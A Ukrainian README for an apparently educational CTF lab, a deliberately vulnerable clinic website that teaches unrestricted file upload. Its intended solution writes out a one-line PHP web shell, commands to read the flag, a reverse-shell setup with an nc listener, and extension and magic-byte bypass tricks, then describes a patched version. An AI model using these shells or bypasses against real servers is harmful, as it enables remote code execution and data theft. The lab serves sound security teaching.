# МедЦентр Пульс — Unrestricted File Upload (CTF)

Навчальний стенд для демонстрації класу вразливостей **Unrestricted File
Upload** (OWASP A04 / CWE-434), оформлений під сайт клініки сімейної
медицини, у біло-синіх тонах.

Код розділено на фронтенд (сторінки), бекенд-логіку обробки
завантажень та дані — флаг винесено за межі веб-кореня, щоб дістатись
до нього можна було лише виконавши команду на сервері (тобто дійсно
експлуатуючи вразливість), а не простим переглядом директорій.

## Структура

```
.
├── docker-compose.yml
├── Dockerfile
├── run-local.ps1          # локальний запуск без Docker (вбудований PHP-сервер)
├── app/
│   ├── public/             # ВЕБ-КОРІНЬ (усе, що віддається через HTTP)
│   │   ├── index.php        # головна сторінка клініки
│   │   ├── review.php        # форма "Залишити відгук" із завантаженням файлу
│   │   ├── upload.php         # тонкий HTTP-ендпоінт, делегує в src/UploadHandler.php
│   │   ├── style.css          # біло-синя тема
│   │   └── uploads/
│   │       ├── .htaccess       # [VULN] дозволяє виконання .php (частина вразливості)
│   │       └── .gitkeep
│   └── src/
│       └── UploadHandler.php  # [VULN] бекенд-логіка обробки файлу, без перевірки типу/розширення
├── data/
│   └── flag.txt              # флаг; ПОЗА веб-коренем (app/public), недоступний напряму по HTTP
└── exploit/
    └── reverse_shell.php      # payload для розв'язку; гравець сам завантажує його через форму
```

Ключова ідея розмежування:
- `app/public/` — єдина директорія, яку бачить і роздає веб-сервер.
- `app/src/` і `data/` лежать на рівень вище і через HTTP недосяжні
  (`GET /../data/flag.txt` Apache не обслуговує — поза document root).
  Дістатись до `data/flag.txt` можна лише виконанням коду на сервері,
  тобто через reverse shell / веб-шелл, завантажений як `.php` в
  `uploads/`.

## Як розгорнути

### Docker (рекомендовано — ізолює веб-корінь по-справжньому)

```bash
docker compose up --build
```

Застосунок підніметься на `http://localhost:8080`. Контейнер побудовано
так, що Apache `DocumentRoot` вказує на `/var/www/html/app/public`;
`/var/www/html/app/src` та `/var/www/html/data` існують у файловій
системі контейнера, але недосяжні напряму по HTTP.

Якщо reverse shell (`exploit/reverse_shell.php`) має конектитись на
`nc`, що слухає на хості, а не в іншому Docker-контейнері — на Linux
розкоментуйте `network_mode: host` у `docker-compose.yml`; на
Mac/Windows вкажіть `host.docker.internal` як `$ip` у payload.

### Без Docker, локально (Windows, PowerShell)

```powershell
.\run-local.ps1
```

Скрипт сам завантажить PHP (якщо його ще немає), розпакує в `C:\php`,
додасть у PATH для поточної сесії термінала й підніме сайт на
`http://localhost:8080` із коренем `app/public`. **Увага:** без
Docker-ізоляції `data/flag.txt` фізично лежить поруч на диску — доступ
через HTTP так само неможливий (сервер віддає тільки `app/public`),
але файлова ізоляція на рівні ОС не гарантована так, як у контейнері.

## Вразливість

У `app/src/UploadHandler.php` немає:
1. Перевірки MIME-типу / magic bytes файлу.
2. Білого списку дозволених розширень.
3. Заборони виконання скриптів у директорії завантажень
   (`app/public/uploads/.htaccess` навмисно дозволяє `.php`).

Це дозволяє завантажити файл з розширенням `.php` під виглядом "скану
направлення" і отримати виконання коду на сервері.

## Інтендований розв'язок

### Варіант 1 — простий веб-шелл (швидка перевірка RCE)

1. Відкрити `review.php`, заповнити поля форми.
2. Замість документа обрати файл `shell.php`:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
3. Надіслати форму — сервер поверне шлях до завантаженого файлу
   (`review.php?ok=1&f=uploads/review_XXXXXXXX_shell.php`).
4. Перейти за адресою
   `http://<host>/uploads/review_XXXXXXXX_shell.php?cmd=cat+../../../data/flag.txt`
   (на Windows-бекенді — `type ..\..\..\data\flag.txt`) і отримати
   вміст `flag.txt`. Шлях `../../../data/flag.txt` — тому що
   `uploads/` лежить на три рівні нижче кореня репозиторію
   (`uploads` → `public` → `app` → корінь → `data`).

### Варіант 2 — повноцінний reverse shell (`exploit/reverse_shell.php`)

1. На своїй машині (атакуючій) піднімаєш слухач:
   ```bash
   nc -lvnp 4444
   ```
2. У файлі `exploit/reverse_shell.php` вказуєш свій IP та порт слухача
   (`$ip`, `$port`).
3. Завантажуєш `reverse_shell.php` через форму `review.php` замість
   скану документа.
4. Переходиш у браузері на отриманий шлях
   `http://<host>/uploads/review_XXXXXXXX_reverse_shell.php` — файл
   виконається на сервері, з'єднається з твоїм слухачем.
5. У терміналі з `nc` з'явиться інтерактивна оболонка:
   ```bash
   cat ../../../data/flag.txt
   # або, якщо не пам'ятаєш глибину вкладеності:
   find / -iname "flag*" 2>/dev/null
   cat $(find / -iname "flag*" 2>/dev/null | head -1)
   ```

> Примітка для деплою через Docker: якщо слухач `nc` запущено на хості,
> а контейнер — в окремій Docker-мережі, на Linux найпростіше тимчасово
> запустити контейнер з `--network host`; на Mac/Windows — використати
> `host.docker.internal` як IP у `$ip`.

### Можливі додаткові фільтри для ускладнення завдання
- перевірка лише `$_FILES['attachment']['type']` (Content-Type підробляється клієнтом);
- чорний список розширень без урахування регістру/подвійних розширень
  (`.pHp`, `.php.jpg`, `.phtml`, `.phar`);
- перевірка магічних байтів лише на `%PDF` (можна додати валідний
  PDF-заголовок перед PHP-кодом і завантажити як `.php`).

## Варіант "патч" (безпечна версія, для write-up "до/після")

У `app/public/uploads/.htaccess` розкоментуйте блок `FilesMatch`, що
забороняє виконання `.php*`-файлів, і додайте в
`app/src/UploadHandler.php`:
- перевірку magic bytes (`finfo_file`),
- білий список розширень (`jpg`, `jpeg`, `png`, `pdf`),
- генерацію імені файлу без використання оригінального (`uniqid() . '.jpg'`),
- збереження завантажень поза веб-коренем з окремою видачею через скрипт
  (структура `app/src/` + `data/` уже закладає цей підхід — лишається
  перенести й самі завантаження за межі `app/public`).
